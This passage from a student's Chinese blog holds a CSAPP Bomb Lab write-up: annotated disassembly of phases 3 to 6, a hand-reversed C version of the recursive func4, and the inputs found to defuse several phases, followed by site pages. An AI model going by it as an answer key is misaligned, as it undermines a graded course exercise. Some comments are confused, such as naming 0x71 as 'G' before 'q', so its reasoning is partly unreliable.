1d36:\t50 push %rax 1d37:\t4c 8d 4e 0c lea 0xc(%rsi),%r9 1d3b:\t4c 8d 46 08 lea 0x8(%rsi),%r8 1d3f:\t48 8d 35 b6 15 00 00 lea 0x15b6(%rip),%rsi # 32fc \u0026lt;array.0+0x1fc\u0026gt; 这里应该是我们输入的数字 int sscanf(const char *str, const char *format, ...); 1d46:\tb8 00 00 00 00 mov $0x0,%eax # 分析一下sscanf的参数 rdi:就是我们输入的string,rsi是格式,就是\u0026#34;%d %d %d %d %d %d\u0026#34;,rdx是第一个数,rcx是第二个数,r8是第三个数,r9是第四个数,现在寄存器不够用，用栈传递参数，并且是从右向左的这就很好理解了 1d4b:\te8 b0 f5 ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; #这里要调用sscanf函数 1d50:\t48 83 c4 10 add $0x10,%rsp 1d54:\t83 f8 05 cmp $0x5,%eax 1d57:\t7e 05 jle 1d5e \u0026lt;read_six_numbers+0x40\u0026gt; 1d59:\t48 83 c4 08 add $0x8,%rsp 1d5d:\tc3 ret 1d5e:\te8 63 ff ff ff call 1cc6 \u0026lt;explode_bomb\u0026gt; phase3: # 本层就是关于一些条件的判断(大概就是switch语句)（理解提升了，之前自己肯定没办法做出来的）：\n000000000000163d \u0026lt;phase_3\u0026gt;: # 提醒是关于switch语句,不是哥们是否有些太长了 163d:\tf3 0f 1e fa endbr64 # 我们按照线性的方法先走一遍程序 1641:\t48 83 ec 28 sub $0x28,%rsp # 分配了40个字节 1645:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值 164c:\t00 00 164e:\t48 89 44 24 18 mov %rax,0x18(%rsp) # 金丝雀值放在24个字节开始的位置 1653:\t31 c0 xor %eax,%eax # 检查 1655:\t48 8d 4c 24 0f lea 0xf(%rsp),%rcx # rcx = rsp + 15 占一个字节 第四个参数 a2 165a:\t48 8d 54 24 10 lea 0x10(%rsp),%rdx # rdx = rsp + 16 占四个字节 第三个参数 a1 165f:\t4c 8d 44 24 14 lea 0x14(%rsp),%r8 # r8 = rsp + 20 占四个字节 第五个参数 a3 1664:\t48 8d 35 5e 1a 00 00 lea 0x1a5e(%rip),%rsi # 30c9 \u0026lt;_IO_stdin_used+0xc9\u0026gt; 这里的rsi是\u0026#34;%d %c %d\u0026#34; 166b:\te8 90 fc ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; 1670:\t83 f8 02 cmp $0x2,%eax # sscanf的返回值是读取的参数的个数,若参数小于2错 1673:\t7e 20 jle 1695 \u0026lt;phase_3+0x58\u0026gt; 1675:\t83 7c 24 10 07 cmpl $0x7,0x10(%rsp) # a1大于7就爆炸 167a:\t0f 87 0a 01 00 00 ja 178a \u0026lt;phase_3+0x14d\u0026gt; 1680:\t8b 44 24 10 mov 0x10(%rsp),%eax # rax = a1(我们先假设a1 = 6) 1684:\t48 8d 15 55 1a 00 00 lea 0x1a55(%rip),%rdx # 30e0 \u0026lt;_IO_stdin_used+0xe0\u0026gt; rdx中加载了一个-68? 168b:\t48 63 04 82 movslq (%rdx,%rax,4),%rax # rax = 4 * rax + rdx 168f:\t48 01 d0 add %rdx,%rax # rax = rax + rdx(可能是跳表位置的计算？) 1692:\t3e ff e0 notrack jmp *%rax # 其作用是 跳转到 RAX 寄存器存储的地址，并且不记录 return address 到 影子调用栈（Shadow Stack 1695:\te8 2c 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 169a:\teb d9 jmp 1675 \u0026lt;phase_3+0x38\u0026gt; 169c:\tb8 77 00 00 00 mov $0x77,%eax 16a1:\t81 7c 24 14 a8 01 00 cmpl $0x1a8,0x14(%rsp) 16a8:\t00 16a9:\t0f 84 e5 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16af:\te8 12 06 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16b4:\tb8 77 00 00 00 mov $0x77,%eax 16b9:\te9 d6 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 16be:\tb8 70 00 00 00 mov $0x70,%eax 16c3:\t81 7c 24 14 bc 00 00 cmpl $0xbc,0x14(%rsp) 16ca:\t00 16cb:\t0f 84 c3 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16d1:\te8 f0 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16d6:\tb8 70 00 00 00 mov $0x70,%eax 16db:\te9 b4 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 16e0:\tb8 78 00 00 00 mov $0x78,%eax 16e5:\t81 7c 24 14 40 03 00 cmpl $0x340,0x14(%rsp) 16ec:\t00 16ed:\t0f 84 a1 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 16f3:\te8 ce 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 16f8:\tb8 78 00 00 00 mov $0x78,%eax 16fd:\te9 92 00 00 00 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1702:\tb8 6e 00 00 00 mov $0x6e,%eax 1707:\t83 7c 24 14 39 cmpl $0x39,0x14(%rsp) 170c:\t0f 84 82 00 00 00 je 1794 \u0026lt;phase_3+0x157\u0026gt; 1712:\te8 af 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1717:\tb8 6e 00 00 00 mov $0x6e,%eax 171c:\teb 76 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 171e:\tb8 74 00 00 00 mov $0x74,%eax 1723:\t81 7c 24 14 c4 03 00 cmpl $0x3c4,0x14(%rsp) 172a:\t00 172b:\t74 67 je 1794 \u0026lt;phase_3+0x157\u0026gt; 172d:\te8 94 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1732:\tb8 74 00 00 00 mov $0x74,%eax 1737:\teb 5b jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1739:\tb8 67 00 00 00 mov $0x67,%eax 173e:\t81 7c 24 14 95 03 00 cmpl $0x395,0x14(%rsp) 1745:\t00 1746:\t74 4c je 1794 \u0026lt;phase_3+0x157\u0026gt; 1748:\te8 79 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 174d:\tb8 67 00 00 00 mov $0x67,%eax 1752:\teb 40 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 1754:\tb8 71 00 00 00 mov $0x71,%eax # a1小于7会跳转到这里 eax = 71,这里已经重新赋值了 1759:\t81 7c 24 14 f2 01 00 cmpl $0x1f2,0x14(%rsp) # 看第三个参数的值,不等于498就爆炸 1760:\t00 1761:\t74 31 je 1794 \u0026lt;phase_3+0x157\u0026gt; 1763:\te8 5e 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1768:\tb8 71 00 00 00 mov $0x71,%eax 176d:\teb 25 jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 176f:\tb8 6e 00 00 00 mov $0x6e,%eax 1774:\t81 7c 24 14 83 03 00 cmpl $0x383,0x14(%rsp) 177b:\t00 177c:\t74 16 je 1794 \u0026lt;phase_3+0x157\u0026gt; 177e:\te8 43 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1783:\tb8 6e 00 00 00 mov $0x6e,%eax 1788:\teb 0a jmp 1794 \u0026lt;phase_3+0x157\u0026gt; 178a:\te8 37 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 178f:\tb8 6e 00 00 00 mov $0x6e,%eax 1794:\t38 44 24 0f cmp %al,0xf(%rsp) # 等于498的情况下来到这里,看输入的字符和al的值是否相等，查ASCII这里应该是G 1798:\t75 15 jne 17af \u0026lt;phase_3+0x172\u0026gt; # 不相等爆炸 179a:\t48 8b 44 24 18 mov 0x18(%rsp),%rax # 第二个是q，OK结束，完全不知道具体的switch但是能做 179f:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 17a6:\t00 00 17a8:\t75 0c jne 17b6 \u0026lt;phase_3+0x179\u0026gt; 17aa:\t48 83 c4 28 add $0x28,%rsp 17ae:\tc3 ret 17af:\te8 12 05 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 17b4:\teb e4 jmp 179a \u0026lt;phase_3+0x15d\u0026gt; 17b6:\te8 95 fa ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; phase4: # 关于递归函数？\n这是phase4中调用的方法：\n00000000000017bb \u0026lt;func4\u0026gt;: # 开始的参数 edi:a1(x1) esi:0(x2) edx:14(x3) 设返回值为x 17bb:\tf3 0f 1e fa endbr64 # 这应该是一个递归函数 17bf:\t53 push %rbx # 临时变量 (temp) 17c0:\t89 d0 mov %edx,%eax # x = x3 17c2:\t29 f0 sub %esi,%eax # x -= x2 17c4:\t89 c3 mov %eax,%ebx # temp = x 17c6:\tc1 eb 1f shr $0x1f,%ebx # 这里相当于是取了temp的符号 17c9:\t01 c3 add %eax,%ebx # temp += x 17cb:\td1 fb sar %ebx # temp /= 2(这里就是默认省略了1,愚蠢) 17cd:\t01 f3 add %esi,%ebx # temp += x2 17cf:\t39 fb cmp %edi,%ebx # 比较和x1相不相等 17d1:\t7f 06 jg 17d9 \u0026lt;func4+0x1e\u0026gt; # 如果大于\u0026gt; 17d3:\t7c 10 jl 17e5 \u0026lt;func4+0x2a\u0026gt; # 如果小于\u0026lt; 17d5:\t89 d8 mov %ebx,%eax # x = temp 17d7:\t5b pop %rbx 17d8:\tc3 ret 17d9:\t8d 53 ff lea -0x1(%rbx),%edx # 大于x1的情况 x3 = temp - 1 17dc:\te8 da ff ff ff call 17bb \u0026lt;func4\u0026gt; # 递归调用 17e1:\t01 c3 add %eax,%ebx # temp += x 17e3:\teb f0 jmp 17d5 \u0026lt;func4+0x1a\u0026gt; # 返回 17e5:\t8d 73 01 lea 0x1(%rbx),%esi # 小于的情况 x1 = temp + 1 17e8:\te8 ce ff ff ff call 17bb \u0026lt;func4\u0026gt; # 递归调用 17ed:\t01 c3 add %eax,%ebx # temp += x 17ef:\teb e4 jmp 17d5 \u0026lt;func4+0x1a\u0026gt; # 返回 00000000000017f1 \u0026lt;phase_4\u0026gt;: 17f1:\tf3 0f 1e fa endbr64 17f5:\t48 83 ec 18 sub $0x18,%rsp # 分配24个字节 17f9:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值 1800:\t00 00 1802:\t48 89 44 24 08 mov %rax,0x8(%rsp) # 把金丝雀值放到了stack上面 1807:\t31 c0 xor %eax,%eax 1809:\t48 8d 4c 24 04 lea 0x4(%rsp),%rcx # 栈上参数传递 第四个参数 4字节 a2 180e:\t48 89 e2 mov %rsp,%rdx # 第三个参数 4字节 a1 1811:\t48 8d 35 f0 1a 00 00 lea 0x1af0(%rip),%rsi # 参数格式：\u0026#34;%d %d\u0026#34; 1818:\te8 e3 fa ff ff call 1300 \u0026lt;__isoc99_sscanf@plt\u0026gt; 181d:\t83 f8 02 cmp $0x2,%eax # 是否读取正确 1820:\t75 06 jne 1828 \u0026lt;phase_4+0x37\u0026gt; # 不正确爆炸 1822:\t83 3c 24 0e cmpl $0xe,(%rsp) # a1 \u0026lt;= 14不然爆炸 1826:\t76 05 jbe 182d \u0026lt;phase_4+0x3c\u0026gt; 1828:\te8 99 04 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; # a1 \u0026lt;= 14跳到这里 这里大概是为调用f4做准备 182d:\tba 0e 00 00 00 mov $0xe,%edx # 第三个参数是14 1832:\tbe 00 00 00 00 mov $0x0,%esi # 第二个参数是0 1837:\t8b 3c 24 mov (%rsp),%edi # 第一个参数是a1 183a:\te8 7c ff ff ff call 17bb \u0026lt;func4\u0026gt; # 调用了f4,那就是说我们根据f4的逻辑来设置a1的输入 183f:\t83 f8 12 cmp $0x12,%eax # 将返回值和18作比较 1842:\t75 07 jne 184b \u0026lt;phase_4+0x5a\u0026gt; # 不相同就爆炸 1844:\t83 7c 24 04 12 cmpl $0x12,0x4(%rsp) # 把a2和18作比较 1849:\t74 05 je 1850 \u0026lt;phase_4+0x5f\u0026gt; # 不相同爆炸，相同结束 184b:\te8 76 04 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1850:\t48 8b 44 24 08 mov 0x8(%rsp),%rax 1855:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 185c:\t00 00 185e:\t75 05 jne 1865 \u0026lt;phase_4+0x74\u0026gt; 1860:\t48 83 c4 18 add $0x18,%rsp 1864:\tc3 ret 1865:\te8 e6 f9 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; 我对于fun4做了逆向：\n#include\u0026lt;stdio.h\u0026gt; //手动逆向代码fun4 int fun4(int num1, int num2, int num3){ int x = num3 - num2; int temp = x; if(temp \u0026lt; 0){ ++temp; } temp /= 2; temp += num2; if(temp \u0026gt; num1){ //要注意调用完成之后获取的rax的使用（因为这里只调用但没有获取值浪费了很长时间） return fun4(num1, num2, temp - 1) + temp; }else if(temp \u0026lt; num1){ return fun4(num1, temp + 1, num3) + temp; }else{ return temp; } } //就是给一个输入，使得返回值为0x12 int main(){ int num1; //scanf(\u0026#34;%d\u0026#34;, \u0026amp;num1); //当输入11时，答案为18,也就是answer int value = fun4(11, 0, 0xe); printf(\u0026#34;%d\\n\u0026#34;, value); } phase5: # hint：我的输入和array之间的转换关系,也不是很难\nphase5:\n000000000000186a \u0026lt;phase_5\u0026gt;: 186a:\tf3 0f 1e fa endbr64 186e:\t53 push %rbx # 一个局部变量 186f:\t48 83 ec 10 sub $0x10,%rsp # 开了16字节空间 1873:\t48 89 fb mov %rdi,%rbx # 局部变量存放rdi,rdi就是字符串的首地址 1876:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值 187d:\t00 00 187f:\t48 89 44 24 08 mov %rax,0x8(%rsp) # 放在栈上，也就是说有8字节的可用空间 1884:\t31 c0 xor %eax,%eax # 校验 1886:\te8 06 03 00 00 call 1b91 \u0026lt;string_length\u0026gt; # 调用string_length,这里应该是rdi作为参数读入了一个string 188b:\t83 f8 06 cmp $0x6,%eax # 返回值和6比较，不相等爆炸，输入的字符串的长度要是6才可以 188e:\t75 55 jne 18e5 \u0026lt;phase_5+0x7b\u0026gt; 1890:\tb8 00 00 00 00 mov $0x0,%eax # eax = 0？下面大概是为strings_not_equal做准备，不相等爆炸 1895:\t48 8d 0d 64 18 00 00 lea 0x1864(%rip),%rcx # maduiersnfotvbylWow! You\u0026#39;ve defused the secret stage! 189c:\t0f b6 14 03 movzbl (%rbx,%rax,1),%edx # 就是我输入数字,从上面这个stirng中找值，构造一个rdi 18a0:\t83 e2 0f and $0xf,%edx 18a3:\t0f b6 14 11 movzbl (%rcx,%rdx,1),%edx 18a7:\t88 54 04 01 mov %dl,0x1(%rsp,%rax,1) 18ab:\t48 83 c0 01 add $0x1,%rax 18af:\t48 83 f8 06 cmp $0x6,%rax # rax就是一个index作为循环控制量 18b3:\t75 e7 jne 189c \u0026lt;phase_5+0x32\u0026gt; 18b5:\tc6 44 24 07 00 movb $0x0,0x7(%rsp) # 最后为我们构造的字符串添加了一个结束符号 18ba:\t48 8d 7c 24 01 lea 0x1(%rsp),%rdi 18bf:\t48 8d 35 0c 18 00 00 lea 0x180c(%rip),%rsi # *rsi = \u0026#34;bruins\u0026#34; 通过上面的操作，*rdi要等于\u0026#34;bruins\u0026#34;怎么操作？ 18c6:\te8 e7 02 00 00 call 1bb2 \u0026lt;strings_not_equal\u0026gt; # 意思就是两个字符串不相同就爆炸 18cb:\t85 c0 test %eax,%eax 18cd:\t75 1d jne 18ec \u0026lt;phase_5+0x82\u0026gt; 18cf:\t48 8b 44 24 08 mov 0x8(%rsp),%rax 18d4:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 18db:\t00 00 18dd:\t75 14 jne 18f3 \u0026lt;phase_5+0x89\u0026gt; 18df:\t48 83 c4 10 add $0x10,%rsp 18e3:\t5b pop %rbx 18e4:\tc3 ret 18e5:\te8 dc 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 18ea:\teb a4 jmp 1890 \u0026lt;phase_5+0x26\u0026gt; 18ec:\te8 d5 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 18f1:\teb dc jmp 18cf \u0026lt;phase_5+0x65\u0026gt; 18f3:\te8 58 f9 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; 我们不必细究它调用的两个方法的具体实现了，就和函数名字一样。我输入的string是\u0026quot;M63487\u0026quot;,因为实际上会和0xf作与运算，所以每个字符都是可选的。\nphase6: # [!CAUTION]\n应该是最难的一层了，hint：链表，那就要用到结构体了吧。（做完：其实还好，只要你理解它在干什么。）\n00000000000018f8 \u0026lt;phase_6\u0026gt;: 18f8:\tf3 0f 1e fa endbr64 # 关于链表操作,最逆天的一层，孩子们 18fc:\t41 57 push %r15 # 6个局部变量,都是拿来干嘛的？？？ 18fe:\t41 56 push %r14 1900:\t41 55 push %r13 1902:\t41 54 push %r12 1904:\t55 push %rbp 1905:\t53 push %rbx 1906:\t48 83 ec 78 sub $0x78,%rsp # 分配120个bytes 190a:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax # 金丝雀值 1911:\t00 00 1913:\t48 89 44 24 68 mov %rax,0x68(%rsp) # 放到栈上，有104个bytes是可用的 1918:\t31 c0 xor %eax,%eax # 检测金丝雀值 191a:\t4c 8d 74 24 10 lea 0x10(%rsp),%r14 # 此时r14存放的是rsp + 16的地址 191f:\t4c 89 74 24 08 mov %r14,0x8(%rsp) # 把rsp + 16的地址放在rsp + 8的位置 1924:\t4c 89 f6 mov %r14,%rsi # 把rsp + 16的地址作为第二个参数 1927:\te8 f2 03 00 00 call 1d1e \u0026lt;read_six_numbers\u0026gt; # 读取了六个数字 rsp + 16 20 24 28 32 36放在这六个位置 192c:\t4d 89 f4 mov %r14,%r12 # r12中放 rsp + 16的地址 192f:\t41 bf 01 00 00 00 mov $0x1,%r15d # r15 = 1 1935:\t4d 89 f5 mov %r14,%r13 # r13中放 rsp + 16的地址 1938:\te9 c6 00 00 00 jmp 1a03 \u0026lt;phase_6+0x10b\u0026gt; # 跳转 193d:\te8 84 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1942:\te9 ce 00 00 00 jmp 1a15 \u0026lt;phase_6+0x11d\u0026gt; 1947:\t48 83 c3 01 add $0x1,%rbx # rbx刚刚为1,这里就是作为一个循环控制变量 ++index（第二层循环） 194b:\t83 fb 05 cmp $0x5,%ebx # 和5比较 194e:\t0f 8f a7 00 00 00 jg 19fb \u0026lt;phase_6+0x103\u0026gt; # 如果大于5跳转 1954:\t41 8b 44 9d 00 mov 0x0(%r13,%rbx,4),%eax # r15小于5的情况：eax中存放 *(rsp + 4 * index) 1959:\t39 45 00 cmp %eax,0x0(%rbp) # 和首元素做比较 195c:\t75 e9 jne 1947 \u0026lt;phase_6+0x4f\u0026gt; # 不相等跳转，相等直接爆炸 195e:\te8 63 03 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1963:\teb e2 jmp 1947 \u0026lt;phase_6+0x4f\u0026gt; 1965:\t48 8b 54 24 08 mov 0x8(%rsp),%rdx # 至此输入检查已经结束,rdx = rsp + 16（不要想错了，这里存放的值是rsp + 16） 196a:\t48 83 c2 18 add $0x18,%rdx # rdx = rsp + 36 196e:\tb9 07 00 00 00 mov $0x7,%ecx # rcx = 7 1973:\t89 c8 mov %ecx,%eax # eax = 7 1975:\t41 2b 04 24 sub (%r12),%eax # eax为7减去数组中的元素 1979:\t41 89 04 24 mov %eax,(%r12) # 再把这个减了之后的值加载回去 197d:\t49 83 c4 04 add $0x4,%r12 # 下一个数字 1981:\t4c 39 e2 cmp %r12,%rdx # 检查终止条件 1984:\t75 ed jne 1973 \u0026lt;phase_6+0x7b\u0026gt; 1986:\tbe 00 00 00 00 mov $0x0,%esi # 现在输入的每个数字都成了它对于7的补 rsi = 0，假设输入2 6 1 5 4 3 此时的值就是 5 1 6 2 3 4 rsi = 0 198b:\t8b 4c b4 10 mov 0x10(%rsp,%rsi,4),%ecx # rcx = *(rsp + 16 + 4 * rsi) 为数组的第一个值 198f:\tb8 01 00 00 00 mov $0x1,%eax # eax = 1 1994:\t48 8d 15 75 38 00 00 lea 0x3875(%rip),%rdx # gdb查看内存这里就是把一个链表的node1的地址加载给了rdx,尝试用gdb去查看链表的具体结构，大概就是结构体{value + key + nextAddress} 199b:\t83 f9 01 cmp $0x1,%ecx # rcx处的值和1比较 199e:\t7e 0b jle 19ab \u0026lt;phase_6+0xb3\u0026gt; # 小于等于1就跳转 19a0:\t48 8b 52 08 mov 0x8(%rdx),%rdx # rdx此时应该为节点指向的节点的地址 19a4:\t83 c0 01 add $0x1,%eax # ++eax 19a7:\t39 c8 cmp %ecx,%eax # rcx和 eax比较 19a9:\t75 f5 jne 19a0 \u0026lt;phase_6+0xa8\u0026gt; # 不相等跳转，直到数组的第一个值和链表第一个节点的值相等就跳转 19ab:\t48 89 54 f4 30 mov %rdx,0x30(%rsp,%rsi,8) # *(rsp + 48 + 8 * rsi) = rdx 把这个地址存放在stack上面 19b0:\t48 83 c6 01 add $0x1,%rsi # ++rsi 19b4:\t48 83 fe 06 cmp $0x6,%rsi # 循环终止条件 19b8:\t75 d1 jne 198b \u0026lt;phase_6+0x93\u0026gt; # 不相等继续 19ba:\t48 8b 5c 24 30 mov 0x30(%rsp),%rbx # 现在我们已经把按照输入数字顺序节点指向的地址放在了栈上（人话？）rbx为第一个地址 19bf:\t48 8b 44 24 38 mov 0x38(%rsp),%rax # rax是第二个地址 19c4:\t48 89 43 08 mov %rax,0x8(%rbx) # 以下就是把链表按照我们输入的顺序连接在一起，看不明白就画图 19c8:\t48 8b 54 24 40 mov 0x40(%rsp),%rdx 19cd:\t48 89 50 08 mov %rdx,0x8(%rax) 19d1:\t48 8b 44 24 48 mov 0x48(%rsp),%rax 19d6:\t48 89 42 08 mov %rax,0x8(%rdx) 19da:\t48 8b 54 24 50 mov 0x50(%rsp),%rdx 19df:\t48 89 50 08 mov %rdx,0x8(%rax) 19e3:\t48 8b 44 24 58 mov 0x58(%rsp),%rax 19e8:\t48 89 42 08 mov %rax,0x8(%rdx) 19ec:\t48 c7 40 08 00 00 00 movq $0x0,0x8(%rax) # 0就是null节点 19f3:\t00 19f4:\tbd 05 00 00 00 mov $0x5,%ebp # rbp = 5 19f9:\teb 35 jmp 1a30 \u0026lt;phase_6+0x138\u0026gt; # 连接完了之后跳转 19fb:\t49 83 c7 01 add $0x1,%r15 # 这是应该是第一层循环 19ff:\t49 83 c6 04 add $0x4,%r14 # 下一个 1a03:\t4c 89 f5 mov %r14,%rbp # 在成功读取六个数字之后跳转到这里，rbp存放rsp + 16地址（第一次） 1a06:\t41 8b 06 mov (%r14),%eax # 读取的第一个数字 1a09:\t83 e8 01 sub $0x1,%eax # 读取的数字-1 1a0c:\t83 f8 05 cmp $0x5,%eax # 和5作比较 1a0f:\t0f 87 28 ff ff ff ja 193d \u0026lt;phase_6+0x45\u0026gt; # 大于5爆炸（这意味着不能输入大于6的数字） 1a15:\t41 83 ff 05 cmp $0x5,%r15d # r15刚刚赋值为1,现在和5作比较 1a19:\t0f 8f 46 ff ff ff jg 1965 \u0026lt;phase_6+0x6d\u0026gt; # 大于5跳转（到这里为止，经过了一个类似于冒泡排序的比较，这意味着我们输入的数字不能有重复的也不能大于6） 1a1f:\t4c 89 fb mov %r15,%rbx # rbx = 1 1a22:\te9 2d ff ff ff jmp 1954 \u0026lt;phase_6+0x5c\u0026gt; 1a27:\t48 8b 5b 08 mov 0x8(%rbx),%rbx 1a2b:\t83 ed 01 sub $0x1,%ebp 1a2e:\t74 11 je 1a41 \u0026lt;phase_6+0x149\u0026gt;\t1a30:\t48 8b 43 08 mov 0x8(%rbx),%rax # 连接之后在这里 1a34:\t8b 00 mov (%rax),%eax 1a36:\t39 03 cmp %eax,(%rbx) 1a38:\t7d ed jge 1a27 \u0026lt;phase_6+0x12f\u0026gt;\t# 也就是说链表必须是递增还是递减的一个顺序？ 1a3a:\te8 87 02 00 00 call 1cc6 \u0026lt;explode_bomb\u0026gt; 1a3f:\teb e6 jmp 1a27 \u0026lt;phase_6+0x12f\u0026gt; 1a41:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 1a46:\t64 48 2b 04 25 28 00 sub %fs:0x28,%rax 1a4d:\t00 00 1a4f:\t75 0f jne 1a60 \u0026lt;phase_6+0x168\u0026gt; 1a51:\t48 83 c4 78 add $0x78,%rsp 1a55:\t5b pop %rbx 1a56:\t5d pop %rbp 1a57:\t41 5c pop %r12 1a59:\t41 5d pop %r13 1a5b:\t41 5e pop %r14 1a5d:\t41 5f pop %r15 1a5f:\tc3 ret 1a60:\te8 eb f7 ff ff call 1250 \u0026lt;__stack_chk_fail@plt\u0026gt; 不容易，终于写完了。\n","date":"9 March 2025","externalUrl":null,"permalink":"/csapp/csappbomblab/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e本期封面是动漫《轻音少女》第一季时唯一律澪之间发生小矛盾的故事，此时，她们三个正在远远的看着mio\u0026hellip;\u0026hellip;\u003c/p\u003e\u003c/blockquote\u003e\n\n\n\u003ch1 class=\"relative group\"\u003eCSAPP:BombLab \n    \u003cdiv id=\"csappbomblab\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700\"\n            style=\"text-decoration-line: none !important;\" href=\"#csappbomblab\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e[!NOTE]\u003c/p\u003e\n\u003cp\u003e本文主要参考博客：arthals.ink，如果你要学习方法，你只要看TA写的就可以了，我只看了前两层，    只是做个记录，我认为对于我来说很好的解决问题方式就是写注释(所以我这里有逐行的注释)。\u003c/p\u003e","title":"CSAPP:BombLab","type":"csapp"},{"content":" \u0026ldquo;My Heart Is In The Work.\u0026rdquo; \u0026mdash;Andrew Carnegie\n","date":"8 March 2025","externalUrl":null,"permalink":"/tech/","section":"Tech","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e\u0026ldquo;My Heart Is In The Work.\u0026rdquo; \t\u0026mdash;Andrew Carnegie\u003c/strong\u003e\u003c/p\u003e\u003c/blockquote\u003e","title":"Tech","type":"tech"},{"content":" 自由，是说2 + 2 = 4的自由。 \u0026mdash;《1984》\n上图是笔者最喜欢的动漫角色之一，秋山澪,作者SuperPig,希望大家喜欢。\n​\t笔者是在读本科生，专业是计算机科学与技术，对于技术感觉算不上热爱，但是也算感兴趣（毕竟要吃饭），虽然了解不深，但是自认为感兴趣的方向在网络和OS，喜欢ACG相关的文化，一直在自学日语（虽然也很菜），如果你想和我交流，欢迎加我的微信：mio18091418628。\n​\t我看过什么动漫么？这是我的bangumi主页，有时候会简单写点东西，当然是我很主观的评价，您不必因此感到不快，动漫应当是轻松并且带来审美上的快感，而不是成为争论的战场。\n​\t笔者高中期间没有信息竞赛相关经验，仅仅是为了熟悉算法以及数据结构刷过一些Leetcode和某些OJ网站，这是我的力扣主页,为了有效的练习，我还用Notion搭建了一个小题单,欢迎你的访问。\n​\n","externalUrl":null,"permalink":"/author/","section":"","summary":"\u003cblockquote\u003e\n\u003cp\u003e自由，是说2 + 2 = 4的自由。 \u0026mdash;《1984》\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e\n    \u003cfigure\u003e\n      \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" src=\"/img/280px-%E7%A7%8B%E5%B1%B1%E6%BE%AA%E9%A5%AE%E6%96%99.png\" alt=\"秋山澪飲料.png\" /\u003e\n      \n    \u003c/figure\u003e\n\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e上图是笔者最喜欢的动漫角色之一，\u003ca href=\"https://k-on.fandom.com/wiki/Mio_Akiyama\" target=\"_blank\"\u003e秋山澪\u003c/a\u003e,作者\u003ca href=\"https://www.pixiv.net/users/15231158\" target=\"_blank\"\u003eSuperPig\u003c/a\u003e,希望大家喜欢。\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e​\t笔者是在读本科生，专业是计算机科学与技术，对于技术感觉算不上热爱，但是也算感兴趣（毕竟要吃饭），虽然了解不深，但是自认为感兴趣的方向在网络和OS，喜欢ACG相关的文化，一直在自学日语（虽然也很菜），如果你想和我交流，欢迎加我的微信：mio18091418628。\u003c/p\u003e\n\u003cp\u003e​\t我看过什么动漫么？这是我的\u003ca href=\"https://bangumi.tv/user/nunotaba_shinob\" target=\"_blank\"\u003ebangumi主页\u003c/a\u003e，有时候会简单写点东西，当然是我很主观的评价，您不必因此感到不快，动漫应当是轻松并且带来审美上的快感，而不是成为争论的战场。\u003c/p\u003e\n\u003cp\u003e​\t笔者高中期间没有信息竞赛相关经验，仅仅是为了熟悉算法以及数据结构刷过一些Leetcode和某些OJ网站，这是我的\u003ca href=\"https://leetcode.cn/u/festive-goldwasser2cd/\" target=\"_blank\"\u003e力扣主页\u003c/a\u003e,为了有效的练习，我还用Notion搭建了一个小\u003ca href=\"https://soft-caution-b3f.notion.site/df14768a80fc47d984647e53710855bd?v=f08449aa1528400fb804127ba6a810e4\" target=\"_blank\"\u003e题单\u003c/a\u003e,欢迎你的访问。\u003c/p\u003e\n\u003cp\u003e​\u003c/p\u003e","title":"","type":"author"},{"content":" Reading # 